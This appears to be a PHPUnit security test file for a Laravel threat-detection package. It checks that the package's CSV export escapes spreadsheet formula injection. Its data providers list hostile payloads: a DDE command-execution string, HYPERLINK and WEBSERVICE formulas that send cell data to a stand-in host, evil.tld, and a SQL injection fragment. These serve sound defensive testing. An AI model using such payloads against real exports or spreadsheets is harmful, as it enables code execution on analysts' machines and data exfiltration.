<?php

namespace JayAnta\ThreatDetection\Tests\Security;

use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Route;
use JayAnta\ThreatDetection\Tests\TestCase;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;

/**
 * TD-002 — CSV formula injection in the threat export.
 *
 * The export is opened in Excel or LibreOffice by the person investigating an
 * incident. A cell beginning with =, +, - or @ is evaluated, and the classic
 * payload (=cmd|'/c calc'!A0) reaches DDE. So a value an attacker put into the
 * log becomes code on the analyst's workstation.
 *
 * ThreatLogController::sanitizeCsvCell() exists for this. These tests establish
 * three separate things: that it works, which columns it is applied to, and
 * whether any attacker-reachable value can start a cell in the first place.
 */
class CsvInjectionTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        $this->createThreatLogsTable();
        $this->createExclusionRulesTable();

        config(['threat-detection.enabled' => true, 'cache.default' => 'array']);
    }

    protected function tearDown(): void
    {
        Cache::flush();
        parent::tearDown();
    }

    private function seedRow(array $overrides = []): void
    {
        DB::table('threat_logs')->insert(array_merge([
            'ip_address' => '203.0.113.9',
            'url' => 'https://example.com/search',
            'user_agent' => 'Mozilla/5.0',
            'type' => '[middleware] XSS Script Tag',
            'payload' => 'x',
            'threat_level' => 'high',
            'confidence_score' => 90,
            'confidence_label' => 'very_high',
            'action_taken' => 'logged',
            'created_at' => now(),
            'updated_at' => now(),
        ], $overrides));
    }

    private function exportedCsv(): string
    {
        $response = $this->get('/api/threat-detection/export');
        $response->assertStatus(200);

        return $response->getContent();
    }

    /**
     * The payloads a spreadsheet will evaluate. The tab and carriage-return
     * variants matter because some importers strip them and then evaluate what
     * follows.
     *
     * @return array<string, array{0: string}>
     */
    public static function formulaPayloads(): array
    {
        return [
            'DDE command execution' => ["=cmd|'/c calc'!A0"],
            'plain formula' => ['=1+1'],
            'plus prefix' => ['+1+1'],
            'minus prefix' => ['-1+1'],
            'at prefix' => ['@SUM(1+1)'],
            'hyperlink exfiltration' => ['=HYPERLINK("http://evil.tld?d="&A1,"click")'],
            'webservice exfiltration' => ['=WEBSERVICE("http://evil.tld/")'],
            'tab then formula' => ["\t=1+1"],
            'carriage return then formula' => ["\r=1+1"],
        ];
    }

    // ── the sanitizer itself ───────────────────────────────────────────────

    /**
     * Applied to the column an attacker can most plausibly influence:
     * country_name arrives from the geo provider over cleartext HTTP, so an
     * on-path attacker chooses its value outright.
     */
    #[Test]
    #[DataProvider('formulaPayloads')]
    public function a_formula_in_the_country_column_is_neutralised_in_the_export(string $payload): void
    {
        $this->seedRow(['country_code' => 'XX', 'country_name' => $payload]);

        $csv = $this->exportedCsv();

        $this->assertStringNotContainsString(
            ',' . $payload,
            $csv,
            'a formula reached the export as the first character of a cell'
        );
        $this->assertStringContainsString("'" . substr($payload, 0, 3), $csv, 'the cell was not prefixed');
    }

    /**
     * The same for every column the sanitizer is applied to, driven by writing
     * the payload straight into the row. This is what the sanitizer promises;
     * whether an attacker can actually reach each column is the next test.
     */
    #[Test]
    #[DataProvider('formulaPayloads')]
    public function a_formula_is_neutralised_in_every_free_text_column(string $payload): void
    {
        $this->seedRow([
            'url' => $payload,
            'type' => $payload,
            'action_taken' => $payload,
            'country_code' => 'XX',
            'country_name' => $payload,
            'cloud_provider' => $payload,
        ]);

        $csv = $this->exportedCsv();

        // Every occurrence of the payload must be preceded by the escape quote.
        $unescaped = preg_match_all('/(?<!\')' . preg_quote($payload, '/') . '/', $csv);

        $this->assertSame(0, $unescaped, "an unescaped formula reached the CSV: {$payload}");
    }

    // ── is it reachable at all from a request? ─────────────────────────────

    /**
     * The columns an attacker controls through a request are url and type, and
     * neither can begin with a formula character: url is $request->fullUrl(),
     * which always starts with the scheme, and type is "[source] Label".
     *
     * This is worth pinning rather than assuming, because it is the reason the
     * sanitizer has never had to do anything in practice — and a future change
     * that stores the raw payload column, or trims the URL to a path, would
     * quietly remove that protection.
     */
    #[Test]
    #[DataProvider('formulaPayloads')]
    public function a_formula_sent_in_a_request_cannot_start_a_cell(string $payload): void
    {
        Route::middleware('threat-detect')->get('/search', fn () => response('OK', 200));

        $this->get('/search?q=' . urlencode($payload) . '&x=' . urlencode("' UNION SELECT a FROM b"))
            ->assertStatus(200);

        $this->assertGreaterThan(0, DB::table('threat_logs')->count(), 'nothing was detected, so this proves nothing');

        $row = DB::table('threat_logs')->first();

        $this->assertStringStartsWith('http', (string) $row->url, 'the url column no longer starts with a scheme');
        $this->assertStringStartsWith('[', (string) $row->type, 'the type column no longer starts with a source tag');

        $csv = $this->exportedCsv();
        $this->assertStringNotContainsString(',' . $payload, $csv);
        $this->assertStringNotContainsString("\n" . $payload, $csv);
    }

    /**
     * TD-002 — the payload column is not exported, which is the single largest
     * reason formula injection is not reachable here. It holds the raw attack
     * string, verbatim, and it is the obvious thing for a future "full export"
     * feature to add.
     */
    #[Test]
    public function the_export_does_not_include_the_raw_payload_column(): void
    {
        $this->seedRow(['payload' => "=cmd|'/c calc'!A0"]);

        $csv = $this->exportedCsv();

        $this->assertStringNotContainsString('=cmd', $csv);
        $this->assertStringNotContainsString('Payload', $csv, 'the export gained a payload column');
    }

    // ── gaps in the sanitizer, as written ──────────────────────────────────

    /**
     * TD-003 — sanitizeCsvCell() anchors on the first character only.
     *
     * ThreatLogController.php:504 tests /^[=+\-@\t\r]/. A leading space, or a
     * leading newline, is not in that class — and both survive fputcsv() inside
     * a quoted field. Whether a given spreadsheet then evaluates the formula
     * depends on the importer: Excel treats " =1+1" as text, LibreOffice's
     * import dialog has a "trim spaces" option that makes it a formula.
     *
     * Recorded as a gap in the defence rather than a demonstrated exploit —
     * see the unverified section of TD_AUDIT.md. It is asserted because the
     * fix is one character (\s) and the cost of being wrong lands on the
     * analyst's workstation.
     */
    #[Test]
    #[DataProvider('whitespacePrefixedFormulas')]
    public function a_formula_behind_leading_whitespace_is_also_neutralised(string $payload): void
    {
        $this->seedRow(['country_code' => 'XX', 'country_name' => $payload]);

        $csv = $this->exportedCsv();

        $this->assertStringContainsString(
            "'",
            $csv,
            'no cell was escaped at all'
        );
        $this->assertMatchesRegularExpression(
            '/\'\s*[=+\-@]/',
            $csv,
            'a whitespace-prefixed formula was exported without the escape quote'
        );
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function whitespacePrefixedFormulas(): array
    {
        return [
            'space then formula' => [' =1+1'],
            'two spaces then formula' => ['  =cmd|\'/c calc\'!A0'],
            'newline then formula' => ["\n=1+1"],
            'space then at' => [' @SUM(1+1)'],
        ];
    }

    // ── the export must stay authorised and bounded ────────────────────────

    #[Test]
    public function the_export_is_capped_so_it_cannot_be_used_to_exhaust_memory(): void
    {
        $source = file_get_contents(__DIR__ . '/../../src/Http/Controllers/ThreatLogController.php');
        $export = substr($source, strpos($source, 'public function export'));

        $this->assertStringContainsString('limit(10000)', $export, 'the export is no longer row-capped');
    }
}
